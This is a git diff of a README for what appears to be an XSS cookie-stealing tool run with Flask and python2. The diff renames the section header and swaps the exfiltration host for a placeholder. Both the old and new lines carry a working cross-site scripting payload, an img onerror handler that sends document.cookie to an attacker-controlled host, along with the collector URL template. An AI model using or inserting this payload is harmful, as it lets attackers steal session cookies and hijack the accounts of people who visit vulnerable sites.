@@ -23,11 +23,8 @@ $ pip install flask
  $ python2 xss.py
  ````
  
-# stealing cookie using xss :
+# Cookie Path :
 
-
-  <h4>enter the cookie in this url </h4>
- 
 
 ````http://YOUR_IP/cookie?cookie=COOKIE```` 
  
@@ -35,7 +32,7 @@ $ pip install flask
 # Payload :
   
   ````
-  "><img src="x" onerror='document.location="http://xss-exploiter/cookie?cookie=" + document.cookie'>
+  "><img src="x" onerror='document.location="http://YOU_IP/cookie?cookie=" + document.cookie'>
   ````
   
 
